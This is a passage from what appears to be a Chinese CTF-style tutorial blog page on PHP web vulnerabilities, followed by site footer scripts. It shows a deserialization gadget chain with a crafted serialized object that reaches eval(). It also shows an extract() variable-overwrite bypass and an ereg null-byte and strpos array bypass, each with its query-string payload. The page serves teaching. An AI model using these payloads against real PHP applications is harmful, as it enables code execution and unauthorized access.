+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$test2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>解题方法：</strong> 把源代码复制到实验区域，初始化一个对象，修改代码中预设变量值为自己想要实现的效果，加上序列化函数，查看序列化结果，如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Aurora</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Aurora</span> <span class="o">=</span> <span class="s2">&#34;i am aurora&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="k">new</span> <span class="nx">Evil</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">//	^~~~~~~~此处修改
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">L</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;i am L--action&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$test2</span><span class="o">=</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//	^~~~~~~~此处修改
+</span></span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Aurora</span><span class="p">();</span>	<span class="c1">//初始化变量
+</span></span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>	<span class="c1">//导出序列化结果
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">序列化结果：O:6:&#34;Aurora&#34;:2:{s:4:&#34;test&#34;;O:4:&#34;Evil&#34;:1:{s:5:&#34;test2&#34;;s:10:&#34;phpinfo();&#34;;}s:6:&#34;Aurora&#34;;s:11:&#34;i am aurora&#34;;}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>将序列化结果传入即可。</p>
+<h2 id="其他漏洞">其他漏洞
+</h2><h3 id="extract">extract()
+</h3><p><code>extract()</code>的作用是把get进来的东西分离为变量名和变量值，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$test</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果我传入<code>?test=hello</code>那么在程序看来就是<code>$test='hello'</code></p>
+<h4 id="例题">例题
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$aurora</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//加载$flag变量代表的文件
+</span></span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span>	<span class="c1">//打开当前目录下的文件
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$aurora</span> <span class="o">==</span> <span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;flag{xxxxx}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;nonono&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>传参：<code>?content=&amp;aurora=</code></p>
+<h3 id="正则表达式和strpos">正则表达式和strpos()
+</h3><ul>
+<li>正则表达式遇到<code>%00</code>时会停止匹配，但<code>strpos()</code>不停</li>
+<li>当数组遇到<code>strpos()</code>时输出NULL</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//输入的内容一定要不能乱来,只有字符串数字
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">ereg</span><span class="p">(</span><span class="s2">&#34;^[a-zA-Z0-9]+$&#34;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;no1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">],</span><span class="s1">&#39; -- &#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">){</span> <span class="c1">//查找&#39;--&#39;在password中第一次出现的位置
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//你输入的内容得要有 --
+</span></span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;flag is xxxxxxx&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;no2&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>传参：<code>?password[]=123%00--</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+<div class="math-katex"></div>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/1.24-1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.24-1 文件包含漏洞和命令执行漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.23-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.23 SQL注入系列-3</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.22 SQL注入系列-2</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.22.SP 奇技淫巧：SQL注入之数据外带</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.21-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.21 Webshell 免杀和正则表达式</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+        <div class="comment-container mt-8"></div>
+        
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="makabaka11/makabaka11.github.io"
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Retr0
+    </section>
+    
+    <section class="running-time">
+    已存在于互联网
+    <span id="runningdays" class="running-days"></span>
+    </section>
+    
+    <section class="totalcount">
+        
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+        发表了102篇文章 · 
+        总计150.75k字
+    </section>
+
+
+    <section class="powerby">
+        
+            Powered by ctOS <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+
+                <script src="/js/APlayer.min.js"></script>
+                <script src="/js/Meting.min.js"></script>
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.eaf1211e4c7db355f37ceea53df13700e1b77fbcc3cfe8c1c1f69e4468a752e1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<link rel="stylesheet" href="/css/custom.css">
+
+<script>
+(function () {
+    const url = new URL(window.location.href);
+
+    
+    if (url.searchParams.has('utterances')) {
+
+        
+        
+        window.location.replace(window.location.pathname);
+    }
+})();
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+
+<script>
+    var pjax = new Pjax({
+        selectors: [".main-container"]
+    });
+</script>
+
+
+<script src=https://www.retr0.xyz/js/topbar.min.js></script>
+
+
+
+<script>
+function initUtterances() {
+    const isArticle = document.querySelector('.article-page') && document.querySelector('.article-content');
+    if (!isArticle) return;
+
+    const oldScript = document.querySelector('script[src^="https://utteranc.es/client.js"]');
+    if (oldScript) oldScript.remove();
+
+    const container = document.querySelector('.comment-container');
+    if (!container) return;
+
+    container.innerHTML = '';
+
+    let script = document.createElement('script');
+    script.src = 'https://utteranc.es/client.js';
+    script.setAttribute('repo', 'makabaka11/makabaka11.github.io');
+    script.setAttribute('issue-term', 'pathname');
+    script.setAttribute('crossorigin', 'anonymous');
+    script.async = true;
+    container.appendChild(script);
+}
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    if (!window.pjax || !window.pjax.state) initUtterances();
+});
+</script>
+
+
+<script>
+pjax._handleResponse = pjax.handleResponse;
+pjax.handleResponse = function(responseText, request, href, options) {
+    if (request.responseText.match("<html")) {
+        if (responseText) {
+            let newDom = new DOMParser().parseFromString(responseText, 'text/html');
+            document.body.setAttribute("class", newDom.body.className);
+        }
+        pjax._handleResponse(responseText, request, href, options);
+    }
+};
+</script>
+
+
+<script>
+topbar.config({
+    barColors: {
+        '0': 'rgba(255, 255, 255, 1)',
+        '1.0': 'rgba(255, 183, 197, 1)'
+    }
+});
+
+document.addEventListener('pjax:send', () => topbar.show());
+
+document.addEventListener('pjax:complete', () => {
+    window.Stack.init();
+    topbar.hide();
+    setTimeout(initUtterances, 0);
+    updateViewCount();
+    renderKaTeX();
+    initPhotoSwipeFromDOM('.article-content');   
+    initLive2D();                                
+});
+</script>
+
+
+<script>
+function updateViewCount() {
+    const viewCountEl = document.getElementById('vercount_value_page_pv');
+    if (!viewCountEl) return;
+
+    viewCountEl.textContent = 'loading...';
+    const url = 'https://cn.vercount.one/js';
+
+    const old = document.querySelector(`script[src="${url}"]`);
+    if (old) old.remove();
+
+    const s = document.createElement('script');
+    s.src = url;
+    s.defer = true;
+    document.head.appendChild(s);
+
+    showHideView();
+}
+
+function showHideView() {
+    const viewCounts = document.querySelectorAll("#viewCount");
+    const isArticle = document.querySelector(".article-page");
+    viewCounts.forEach(ele => ele.style.display = isArticle ? 'block' : 'none');
+}
+</script>
+
+<script>
+    function showHideView() {
+        
+        let viewCounts = document.querySelectorAll("#viewCount");
+        if (viewCounts) {
+            
+            let article =  document.querySelector(".article-page");
+            if (!article) {
+                viewCounts.forEach(ele => {
+                    ele.style.display = 'none';
+                });
+            }
+        }
+    }
+    
+    showHideView();
+</script>
+
+
+
+<script>
+async function renderKaTeX() {
+    let katex = document.querySelector(".math-katex");
+    if (!katex) return;
+
+    while (typeof renderMathInElement !== 'function') {
+        await new Promise(r => setTimeout(r, 500));
+    }
+
+    const content = document.querySelector('.article-content') || document.body;
+    renderMathInElement(content, {
+        delimiters: [
+            { left: "$$", right: "$$", display: true },
+            { left: "$", right: "$", display: false },
+            { left: "\\(", right: "\\)", display: false },
+            { left: "\\[", right: "\\]", display: true }
+        ],
+        ignoredClasses: ["gist"]
+    });
+}
+</script>
+
+
+<div id="particles-js"></div>
+
+<script src=https://www.retr0.xyz/background/particles.min.js></script>
+<script>
+particlesJS.load('particles-js',
+    "https://www.retr0.xyz/background/particlesjs-config.json",
+    () => console.log('particles.js loaded')
+);
+</script>
+
+<style>
+#particles-js {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    z-index: -1;
+}
+</style>
+
+<script>
+
+function initPhotoSwipeFromDOM(selector) {
+    if (!window.PhotoSwipe) return;
+
+    const containers = document.querySelectorAll(selector);
+    if (!containers.length) return;
+
+    containers.forEach(container => {
+        const images = container.querySelectorAll('img');
+
+        images.forEach((img, index) => {
+
+            
+            function getImageSize() {
+                return new Promise(resolve => {
+                    if (img.complete && img.naturalWidth) {
+                        resolve({
+                            w: img.naturalWidth,
+                            h: img.naturalHeight
+                        });
+                    } else {
+                        const tmp = new Image();
+                        tmp.src = img.src || img.getAttribute("data-src");
+                        tmp.onload = () => resolve({ w: tmp.width, h: tmp.height });
+                    }
+                });
+            }
+
+            img.style.cursor = "zoom-in";
+
+            
+            img.addEventListener("click", async (e) => {
+                e.preventDefault();
+
+                const size = await getImageSize();
+                const pswpEl = document.querySelector('.pswp');
+
+                const items = Array.from(images).map(i => ({
+                    src: i.src || i.getAttribute("data-src"),
+                    msrc: i.src,
+                    w: i.naturalWidth || 800,
+                    h: i.naturalHeight || 600,
+                }));
+
+                items[index].w = size.w;
+                items[index].h = size.h;
+
+                const gallery = new PhotoSwipe(pswpEl, PhotoSwipeUI_Default, items, {
+                    index,
+                    history: false
+                });
+
+                
+                
+                
+                enablePhotoSwipeWebShare(gallery);
+
+                gallery.init();
+            });
+        });
+    });
+}
+
+
+
+
+
+function enablePhotoSwipeWebShare(gallery) {
+    gallery.listen('shareLinkClick', function(shareButtonData, e) {
+        e.preventDefault();
+
+        const item = gallery.currItem;
+
+        if (navigator.share) {
+            navigator.share({
+                title: document.title,
+                text: '给你分享一张图片：',
+                url: item.src
+            }).catch(err => console.log("分享失败：", err));
+
+            return false; 
+        }
+
+        
+        return true;
+    });
+}
+</script>
+
+
+
+<script>
+
+
+window._live2d_loaded = window._live2d_loaded || false;
+window._live2d_initialized = window._live2d_initialized || false;
+
+
+function loadLive2DAssetsOnce(cdnPath) {
+    if (window._live2d_loaded) return Promise.resolve();
+
+    window._live2d_loaded = true;
+
+    return Promise.all([
+        loadRes(cdnPath + "waifu.css", "css"),
+        loadRes(cdnPath + "Core/live2dcubismcore.js", "js"),
+        loadRes(cdnPath + "live2d-sdk.js", "js"),
+        loadRes(cdnPath + "waifu-tips.js", "js")
+    ]);
+}
+
+
+function initLive2DWidgetOnce(cdnPath) {
+
+    if (window._live2d_initialized) return;
+
+    
+    const old = document.querySelector("#waifu");
+    if (old) old.remove();
+
+    window._live2d_initialized = true;
+
+    initWidget({
+        waifuPath: cdnPath + "waifu-tips.json",
+        cdnPath: cdnPath + "Resources/",
+        tools: ["hitokoto", "asteroids", "express", "switch-model", "switch-texture", "photo", "info", "quit"],
+        dragEnable: true,
+        dragDirection: ["x", "y"],
+        switchType: "order"
+    });
+
+    console.log("[Live2D] Widget initialized.");
+}
+
+
+function loadRes(url, type) {
+    return new Promise((resolve) => {
+        let tag;
+        if (type === "css") {
+            tag = document.createElement("link");
+            tag.rel = "stylesheet";
+            tag.href = url;
+        } else {
+            tag = document.createElement("script");
+            tag.src = url;
+        }
+        tag.onload = resolve;
+        document.head.appendChild(tag);
+    });
+}
+
+
+function initLive2D() {
+    if (screen.width < 768) return;
+
+    const cdnPath = "https://www.retr0.xyz/blog-live2d/";
+
+    loadLive2DAssetsOnce(cdnPath)
+        .then(() => initLive2DWidgetOnce(cdnPath));
+}
+
+initLive2D();  
+
+
+document.addEventListener("pjax:complete", () => {
+    initLive2D(); 
+});
+</script>
+
+
+<style>
+    .highlight {
+         
+        max-height: 400px;
+        overflow: hidden;
+        position: relative;  
+    }
+
+    .code-show {
+        max-height: none !important;
+    }
+
+    .code-more-box {
+        width: 100%;
+        padding-top: 78px;
+        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 1;
+    }
+
+    .code-more-btn {
+        display: block;
+        margin: auto;
+        width: 44px;
+        height: 22px;
+        background: #f0f0f5;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        padding-top: 6px;
+        cursor: pointer;
+    }
+
+    .code-more-img {
+        cursor: pointer !important;
+        display: block;
+        margin: auto;
+        width: 22px;
+        height: 16px;
+    }
+</style>
+
+<script>
